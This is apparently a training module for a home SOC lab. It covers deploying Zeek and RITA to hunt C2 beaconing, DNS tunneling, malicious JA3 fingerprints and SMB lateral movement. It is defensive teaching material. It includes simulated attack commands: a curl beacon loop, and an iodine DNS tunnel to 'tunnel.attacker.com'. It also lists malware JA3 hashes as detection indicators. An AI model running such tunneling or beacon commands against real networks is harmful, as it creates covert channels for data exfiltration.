# Module 01 — Zeek + RITA
## Network Traffic Analysis + Beaconing Detection

---

## What You'll Build

A passive network security monitoring stack that:
- Silently watches all network traffic (no agents needed)
- Generates 20+ structured JSON log types (DNS, HTTP, SSL, SSH, SMB, files...)
- Detects C2 beaconing with statistical analysis (RITA)
- Identifies DNS tunneling, data exfiltration, lateral movement
- JA3/JA3S TLS fingerprinting for malware TLS detection
- Feeds alerts to TheHive for case creation

---

## Step 1 — Deploy Zeek

```bash
# On Zeek VM (192.168.50.10)
# eth0 = management, eth1 = monitor (promiscuous, sees all target traffic)
sudo MONITOR_IFACE=eth1 ./install-zeek.sh
```

### Verify Zeek is running
```bash
/opt/zeek/bin/zeekctl status
# Should show: zeek running

# Watch live DNS queries
tail -f /opt/zeek/logs/current/dns.log | python3 -m json.tool | grep query

# Watch live HTTP
tail -f /opt/zeek/logs/current/http.log | jq '{ts,host,uri,user_agent}'
```

---

## Step 2 — Deploy RITA

```bash
sudo ./install-rita.sh

# Run analysis on today's traffic
rita-analyze-now

# View HTML report (copy to analyst workstation)
rita html-report --database zeek-$(date +%Y%m%d) --output /var/www/html/rita/
```

---

## Step 3 — Threat Hunting Scenarios

### Hunt 1 — Detect C2 Beaconing

```bash
# Simulate C2 from Kali (every 30 seconds beacon)
# On Kali:
while true; do curl -s http://192.168.30.10/beacon > /dev/null; sleep 30; done &

# Let it run for 30+ minutes, then on Zeek VM:
rita-analyze-now

# RITA output will show high beacon score for 192.168.20.10
rita show-beacons --database zeek-$(date +%Y%m%d) --human-readable
```

**Expected RITA output:**
```
+---------------+---------------+-----------+-------------+----------+
| Score         | Source        | Dest      | Connections | Avg Bytes|
+---------------+---------------+-----------+-------------+----------+
| 0.983         | 192.168.20.10 | 192.168.30.10 | 64      | 245      |
+---------------+---------------+-----------+-------------+----------+
```
Score > 0.9 = almost certainly automated/beaconing

### Hunt 2 — DNS Tunneling Detection

```bash
# On Kali: simulate DNS tunneling (iodine tool)
sudo iodine -f -P password tunnel.attacker.com

# On Zeek VM: check DNS logs for encoding patterns
cat /opt/zeek/logs/current/dns.log | jq 'select(.query | length > 40)' | \
    jq '{ts, query, qtype_name, answers}'

# RITA will flag high subdomain count
rita show-exploded-dns --database zeek-$(date +%Y%m%d) --human-readable
```

### Hunt 3 — JA3 TLS Fingerprinting

```bash
# View all TLS fingerprints seen today
cat /opt/zeek/logs/current/ssl.log | jq '{ts, ja3, ja3s, server_name}' | head -50

# Check against known malware JA3s
# Known bad JA3 hashes (Cobalt Strike, Emotet, etc.):
KNOWN_BAD=(
    "72a589da586844d7f0818ce684948eea"  # Cobalt Strike default
    "a0e9f5d64349fb13191bc781f81f42e1"  # Metasploit
    "b386946a5a44d1ddcc843bc75336dfce"  # Dridex
)

for ja3 in "${KNOWN_BAD[@]}"; do
    echo "Checking JA3: $ja3"
    grep "$ja3" /opt/zeek/logs/current/ssl.log | jq '{ts, id.orig_h, id.resp_h, server_name}'
done
```

### Hunt 4 — Lateral Movement via SMB

```bash
# Watch for internal SMB connections (port 445)
cat /opt/zeek/logs/current/conn.log | \
    jq 'select(.id.resp_p == 445 and (.id.orig_h | startswith("192.168")))' | \
    jq '{ts, orig_h: .id.orig_h, resp_h: .id.resp_h, duration, bytes: .orig_bytes}'
```

### Hunt 5 — Large DNS Responses (Data Exfil)

```bash
# DNS responses over 512 bytes = suspicious (possible tunnel or exfil)
cat /opt/zeek/logs/current/dns.log | \
    jq 'select(.rtt > 0 and (.answers | length) > 5)' | \
    jq '{ts, query, answer_count: (.answers | length), answers}' | head -20
```

---

## Key Zeek Log Files

| Log | What to hunt for |
|---|---|
| `conn.log` | Long duration connections, large bytes transferred |
| `dns.log` | Long queries, high-freq same domain, large responses |
| `http.log` | Suspicious user agents, POST to unusual hosts |
| `ssl.log` | Self-signed certs, unusual JA3, expired certs |
| `files.log` | Executables downloaded, unusual MIME types |
| `notice.log` | Zeek alerts from our custom soc-detection.zeek |
| `weird.log` | Protocol anomalies (truncated packets, bad headers) |
| `x509.log` | Phishing certs, recently-issued certs |

---

## Zeek Quick Reference

```bash
# Deploy after config changes
/opt/zeek/bin/zeekctl deploy

# Check status
/opt/zeek/bin/zeekctl status

# Watch all notice alerts live
tail -f /opt/zeek/logs/current/notice.log | jq '{ts, note, msg, src, dst}'

# Find all file downloads
cat /opt/zeek/logs/current/files.log | jq 'select(.mime_type == "application/x-dosexec")' \
    | jq '{ts, tx_hosts, rx_hosts, mime_type, filename, sha256}'

# Top talkers
cat /opt/zeek/logs/current/conn.log | jq -r '.id.orig_h' | sort | uniq -c | sort -rn | head 10

# Find connections that lasted > 1 hour
cat /opt/zeek/logs/current/conn.log | \
    jq 'select(.duration != null and .duration > 3600)' | \
    jq '{ts, orig_h: .id.orig_h, resp_h: .id.resp_h, duration, bytes: .orig_bytes}'
```
